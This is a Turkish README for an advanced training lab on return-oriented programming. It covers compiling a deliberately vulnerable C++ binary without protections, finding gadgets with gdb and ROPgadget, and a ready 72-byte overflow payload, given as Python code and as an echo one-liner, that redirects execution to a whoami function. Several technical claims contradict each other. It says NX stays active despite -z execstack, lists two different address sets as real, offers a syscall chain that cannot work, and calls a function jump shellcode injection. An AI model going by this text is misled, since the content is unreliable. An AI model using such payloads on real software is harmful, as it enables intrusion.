# CyberLabs: ROP (Return-Oriented Programming) Zafiyeti Laboratuvarı

**Modül Kodu:** CL-MEM-005

**Seviye:** İleri

**Konu:** Modern Exploit Teknikleri ve Koruma Bypass

## Laboratuvarın Amacı

Bu laboratuvar, CyberLabs eğitim platformu için hazırlanmış olup, modern exploit tekniklerinden biri olan **Return-Oriented Programming (ROP)** konusunu ele almaktadır. Katılımcıların bu laboratuvar sonunda aşağıdaki yetkinlikleri kazanması hedeflenmektedir:

- ROP tekniğinin temel prensiplerini ve NX bit korumasını nasıl aştığını anlamak.
- Mevcut kod parçalarını (gadget'ları) kullanarak program akışını kontrol etmeyi öğrenmek.
- `objdump`, `gdb` ve `ROPgadget` gibi araçlarla gadget analizi yapmak.
- Gerçek bir ROP chain oluşturarak program akışını ele geçirmeyi pratik olarak görmek.
- Modern koruma mekanizmalarını (NX, ASLR, Stack Canary) aşma tekniklerini öğrenmek.

## Zorluk Seviyeleri

## 🟢 **KOLAY YOL: Debug Sembolleri ile**
```bash
# test_lab.sh dosyasında -g flag'ini ekleyin
g++ -m64 -fno-stack-protector -z execstack -no-pie -g -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```
- Debug sembolleri ile daha kolay analiz
- GDB'de `p &variable` komutları çalışır
- Eğitim amaçlı ideal

## 🔴 **ZOR YOL: Debug Sembolleri Olmadan (Varsayılan)**
```bash
# Mevcut derleme (debug sembolleri yok)
g++ -m64 -fno-stack-protector -z execstack -no-pie -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```
- Gerçek dünyaya daha yakın
- `info functions`, `disassemble` komutları gerekir
- Production binary'lerde debug sembolleri yoktur

## ROP (Return-Oriented Programming) Nedir?

**Return-Oriented Programming (ROP)**, modern işletim sistemlerindeki **NX bit** (No-Execute) korumasını aşmak için geliştirilmiş bir exploit tekniğidir. Bu teknik, saldırganın kendi shellcode'unu çalıştırması yerine, programda zaten mevcut olan kod parçalarını (gadget'ları) kullanarak program akışını kontrol etmesini sağlar.

### ROP'un Temel Prensipleri:

1. **Gadget Bulma:** Programda `ret` komutu ile biten küçük kod parçalarını bulma
2. **Chain Oluşturma:** Bu gadget'ları sıralı olarak birleştirerek istenen işlevi gerçekleştirme
3. **Stack Manipulation:** Stack'i kullanarak gadget'lar arasında veri aktarımı yapma
4. **Return Address Overwrite:** Buffer overflow ile return address'i ilk gadget'ın adresi ile değiştirme

### ROP Avantajları:
- NX bit korumasını aşar
- ASLR'ı aşabilir (information leak ile)
- Stack Canary'yi aşabilir
- Gerçek kod kullanır, antivirus tarafından tespit edilmesi zor

## Disclaimer / Yasal Uyarı

Bu laboratuvar içeriği, tamamen **CyberLabs eğitim ortamı** için tasarlanmıştır. Buradaki bilgi ve kodların amacı, siber güvenlik uzmanlarının savunma mekanizmalarını daha iyi anlamalarına ve zafiyet analizi yeteneklerini geliştirmelerine yardımcı olmaktır.

### Yasak Kullanımlar
- CyberLabs eğitim ortamı dışında kullanım
- Yasa dışı faaliyetler veya yetkisiz sistem erişimi
- Gerçek sistemlerin kötü niyetli sömürülmesi
- Eğitim dışı amaçlarla dağıtım

### Sorumluluk
Bu materyallerin CyberLabs ortamı dışında veya yasa dışı amaçlarla kullanılması kesinlikle yasaktır ve tüm sorumluluk kullanıcıya aittir. Yazarlar ve CyberLabs, bu eğitim materyallerinin kötüye kullanımından sorumlu değildir.

## Senaryo

Laboratuvar senaryosu, iki ana bileşenden oluşmaktadır:

1. **`vulnerable_code.cpp`:** İçerisinde kasıtlı olarak bir buffer overflow zafiyeti barındıran, C++ ile yazılmış hedef uygulama. NX bit koruması aktif olmasına rağmen ROP ile sömürülebilir.

2. **`exploit.py`:** Zafiyetli uygulamadaki açığı kullanarak ROP chain oluşturan ve program akışını ele geçiren Python exploit script'i.

## Platform Uyumluluğu

Bu lab hem **Linux (x86_64)** hem de **macOS (ARM64)** platformlarında çalışır:

### 🐧 **Linux x86_64**
- Gerçek ROP chain kullanır
- x86_64 assembly gadget'ları
- NX bit bypass teknikleri
- Production benzeri ortam

### 🍎 **macOS ARM64**
- Eğitim amaçlı basit ROP chain
- ARM64 mimarisi farklılıkları
- Platform-specific optimizasyonlar
- Geliştirme ortamı

## Kurulum ve Çalıştırma Adımları

### 1. Zafiyetli Kodu Derleme

```bash
# Otomatik derleme (platform detection ile)
./compile_linux.sh

# Linux için manuel derleme
g++ -m64 -fno-stack-protector -z execstack -no-pie -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp

# macOS için manuel derleme
g++ -m64 -fno-stack-protector -no-pie -Wno-unused-result -Wno-shift-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```

**Derleme Bayrakları Açıklaması:**
- `-m64`: 64-bit derleme
- `-fno-stack-protector`: Stack canary korumasını devre dışı bırak
- `-z execstack`: Stack'i executable yap (bazı ROP teknikleri için)
- `-no-pie`: Position Independent Executable'ı devre dışı bırak
- `-Wno-unused-result`: Kullanılmayan sonuç uyarılarını bastır
- `-Wno-stringop-overflow`: String overflow uyarılarını bastır

### 2. ROP Gadget'larını Analiz Etme

```bash
# Objdump ile gadget'ları bulma
objdump -d compiled/vulnerable_code | grep -E "(pop rdi|pop rsi|pop rdx|syscall)"

# ROPgadget aracı ile (eğer yüklüyse)
ROPgadget --binary compiled/vulnerable_code --ropchain
```

### 3. GDB ile Dinamik Analiz

```bash
gdb ./compiled/vulnerable_code
(gdb) info functions
(gdb) disassemble win_function
(gdb) disassemble gadget_pop_rdi
(gdb) break vulnerable_function
(gdb) run
```

### 4. Exploit Çalıştırma

```bash
# Otomatik test
./test_lab.sh

# Manuel exploit
python3 source_code/exploit.py
```

## ROP Chain Yapısı

Bu laboratuvarda kullanılan ROP chain yapısı:

### 🐧 **Linux x86_64:**
```
Buffer Overflow (64 bytes) + 
Return Address Overwrite (8 bytes) +
ROP Chain:
├── pop rdi; ret (gadget)
├── 0x0 (rdi değeri)
├── pop rsi; ret (gadget)  
├── 0x0 (rsi değeri)
├── pop rdx; ret (gadget)
├── 0x0 (rdx değeri)
├── syscall; ret (gadget)
└── execute_whoami (shellcode enjeksiyonu)
```

### 🍎 **macOS ARM64:**
```
Buffer Overflow (64 bytes) + 
Return Address Overwrite (8 bytes) +
ROP Chain:
└── execute_whoami (basit komut enjeksiyonu)
```

### 💻 **Shellcode Enjeksiyonu:**
- **Linux:** Gerçek ROP chain ile `system("whoami")` çağrısı
- **macOS:** Basit fonksiyon çağrısı ile `system("whoami")` çalıştırma
- **Hedef:** Sistem komutlarını ROP ile çalıştırma

## Öğrenme Hedefleri

### Temel Seviye:
- ROP tekniğinin ne olduğunu anlama
- Gadget kavramını öğrenme
- Basit ROP chain oluşturma

### Orta Seviye:
- NX bit korumasını aşma
- Stack manipulation teknikleri
- Register değerlerini kontrol etme

### İleri Seviye:
- Karmaşık ROP chain'leri
- ASLR bypass teknikleri
- Real-world ROP exploit'leri

## Gerekli Araçlar

- **GDB:** Dinamik analiz ve debugging
- **objdump:** Statik analiz ve gadget bulma
- **ROPgadget:** Otomatik gadget analizi (opsiyonel)
- **pwntools:** Python exploit geliştirme
- **hexdump:** Binary veri analizi

## Troubleshooting

### Yaygın Sorunlar:

1. **"Permission denied" hatası:**
   ```bash
   chmod +x compiled/vulnerable_code
   ```

2. **"Address not found" hatası:**
   - GDB ile adresleri manuel bulun
   - `info functions` komutunu kullanın

3. **"ROP chain failed" hatası:**
   - Gadget adreslerini kontrol edin
   - Stack alignment'ı kontrol edin

## Tam Çözüm (GDB ile Adres Bulma)

### 1. GDB ile Adres Bulma

```bash
# Binary'yi GDB ile aç
gdb ./compiled/vulnerable_code

# Fonksiyon adreslerini bul
(gdb) info functions
(gdb) info functions win_function
(gdb) info functions execute_whoami
(gdb) info functions gadget_pop_rdi
(gdb) info functions gadget_pop_rsi
(gdb) info functions gadget_pop_rdx
(gdb) info functions gadget_syscall

# Gerçek adresler (Linux x86_64):
# win_function: 0x401166
# execute_whoami: 0x401220
# gadget_pop_rdi: 0x401323
# gadget_pop_rsi: 0x40133a
# gadget_pop_rdx: 0x401351
# gadget_syscall: 0x401368

# ROPgadget ile bulunan gerçek gadget'lar:
# pop rdi; ret: 0x401383
# pop rsi; ret: 0x40138c
# pop rdx; ret: 0x401395
# syscall: 0x40139e

# Disassembly ile gadget'ları incele
(gdb) disassemble win_function
(gdb) disassemble execute_whoami
(gdb) disassemble gadget_pop_rdi
(gdb) disassemble gadget_pop_rsi
(gdb) disassemble gadget_pop_rdx
(gdb) disassemble gadget_syscall

# Buffer overflow'u test et
(gdb) break vulnerable_function
(gdb) run
(gdb) x/32gx $rsp
(gdb) continue

# Detaylı dinamik analiz
(gdb) break vulnerable_function
(gdb) run
(gdb) info registers
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x50
(gdb) disassemble vulnerable_function
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

### 2. GDB ile Detaylı Dinamik Analiz

#### 2.1. Temel Analiz
```bash
# Binary'yi GDB ile aç
gdb ./compiled/vulnerable_code

# Programı çalıştır ve breakpoint koy
(gdb) break vulnerable_function
(gdb) run

# Register'ları incele
(gdb) info registers
(gdb) info all-registers

# Stack durumunu incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x50
```

#### 2.2. Buffer Overflow Analizi
```bash
# vulnerable_function'da breakpoint
(gdb) break vulnerable_function
(gdb) run

# Stack layout'ını incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp+0x40

# Buffer'ın adresini bul
(gdb) disassemble vulnerable_function
(gdb) x/32gx $rsp+0x8

# Return address'i bul
(gdb) x/gx $rsp+0x48
(gdb) x/gx $rbp+0x8
```

#### 2.3. ROP Chain Testi
```bash
# Payload ile test
(gdb) run
# Payload'ı manuel olarak gir:
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00

# Stack'i incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp

# Return address'in değişip değişmediğini kontrol et
(gdb) x/gx $rsp+0x48
(gdb) x/gx $rbp+0x8
```

#### 2.4. Gadget Analizi
```bash
# Gadget'ları tek tek test et
(gdb) break gadget_pop_rdi
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) info registers

# execute_whoami fonksiyonunu test et
(gdb) break execute_whoami
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) continue
```

#### 2.5. Memory Layout Analizi
```bash
# Memory mapping'i incele
(gdb) info proc mappings
(gdb) info files
(gdb) info target

# Stack ve heap durumunu incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x100
```

#### 2.6. Gelişmiş GDB Teknikleri
```bash
# Conditional breakpoint'ler
(gdb) break vulnerable_function if $rsp == 0x7fffffffe000
(gdb) break execute_whoami if $rdi == 0x401220

# Watchpoint'ler
(gdb) watch *0x7fffffffe048
(gdb) watch $rsp+0x48

# TUI modunda analiz
(gdb) layout asm
(gdb) layout regs
(gdb) layout split

# Script ile otomatik analiz
(gdb) define analyze_rop
> break vulnerable_function
> run
> x/32gx $rsp
> x/gx $rsp+0x48
> continue
> end
(gdb) analyze_rop
```

#### 2.7. ROP Chain Debugging
```bash
# ROP chain'i adım adım debug et
(gdb) break vulnerable_function
(gdb) run
# Payload'ı gir
(gdb) x/32gx $rsp
(gdb) x/gx $rsp+0x48
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

#### 2.8. Exploit Doğrulama
```bash
# Exploit'in çalışıp çalışmadığını kontrol et
(gdb) break execute_whoami
(gdb) run
# Payload'ı gir
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) info registers
(gdb) continue
```

#### 2.9. GDB Script Örnekleri
```bash
# ROP analizi için GDB script
(gdb) define rop_analysis
> echo === ROP Analysis Started ===\n
> break vulnerable_function
> run
> echo === Stack State ===\n
> x/32gx $rsp
> echo === Return Address ===\n
> x/gx $rsp+0x48
> echo === Buffer Content ===\n
> x/32gx $rsp+0x8
> echo === Analysis Complete ===\n
> end

# Gadget test script
(gdb) define test_gadgets
> echo === Testing Gadgets ===\n
> break gadget_pop_rdi
> run
> x/32gx $rsp
> stepi
> info registers
> break gadget_pop_rsi
> continue
> x/32gx $rsp
> stepi
> info registers
> end
```

#### 2.10. Hata Ayıklama Teknikleri
```bash
# Segmentation fault analizi
(gdb) run
# Program crash olduğunda
(gdb) bt
(gdb) info registers
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp

# Stack corruption kontrolü
(gdb) break vulnerable_function
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

### 3. ROP Chain Oluşturma

#### Linux x86_64 için:
```python
# Buffer overflow (64 bytes) + Return address overwrite (8 bytes)
payload = b"A" * 72

# Basit ROP chain - sadece execute_whoami fonksiyonunu çağır
payload += p64(0x401220)        # execute_whoami fonksiyonu

# Alternatif: Gerçek ROP chain (gelişmiş)
# payload += p64(0x401383)        # pop rdi; ret
# payload += p64(0x0)             # rdi değeri
# payload += p64(0x40138c)        # pop rsi; ret  
# payload += p64(0x0)             # rsi değeri
# payload += p64(0x401395)        # pop rdx; ret
# payload += p64(0x0)             # rdx değeri
# payload += p64(0x40139e)        # syscall
# payload += p64(0x401220)        # execute_whoami fonksiyonu
```

#### macOS ARM64 için:
```python
# Buffer overflow (64 bytes) + Return address overwrite (8 bytes)
payload = b"A" * 72

# Basit ROP chain (ARM64 farklı)
payload += p64(whoami_addr)     # execute_whoami fonksiyonu
```

### 3. Exploit Çalıştırma

```bash
# Exploit'i çalıştır
python3 source_code/exploit.py

# Manuel test (Linux x86_64)
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00" | ./compiled/vulnerable_code

# ROPgadget ile gadget'ları bul
ROPgadget --binary compiled/vulnerable_code --ropchain

# Belirli gadget'ları ara
objdump -d compiled/vulnerable_code | grep -E "(pop rdi|pop rsi|pop rdx|syscall)"
```

### 4. Beklenen Sonuç

```
Shellcode Enjeksiyonu Basarili!
'whoami' komutu calistiriliyor...
[kullanici_adi]
Komut basariyla calistirildi!

ROP ile sistem komutu basariyla enjekte edildi!
```

## İleri Seviye Konular

- **ASLR Bypass:** Information leak ile ASLR'ı aşma
- **Stack Pivot:** Stack pointer'ı manipüle etme
- **JOP (Jump-Oriented Programming):** ROP'un alternatifi
- **COP (Call-Oriented Programming):** Call instruction'ları kullanma
- **ROP Chain Optimization:** Daha verimli chain'ler oluşturma

## Kaynaklar

- [ROP Emporium](https://ropemporium.com/) - ROP öğrenme platformu
- [Phrack ROP Article](http://phrack.org/issues/58/4.html) - ROP'un temel makalesi
- [ROPgadget Documentation](https://github.com/JonathanSalwan/ROPgadget) - Gadget analiz aracı
- [pwntools Documentation](https://docs.pwntools.com/) - Exploit geliştirme kütüphanesi

## Katkıda Bulunma

Bu laboratuvarı geliştirmek için:
1. Fork yapın
2. Yeni özellik ekleyin
3. Pull request gönderin

## Lisans

Bu proje MIT lisansı altında lisanslanmıştır.

## İletişim

- **CyberLabs:** [GitHub](https://github.com/CyberLabs)
- **E-posta:** info@cyberlabs.com
- **Web:** https://cyberlabs.com
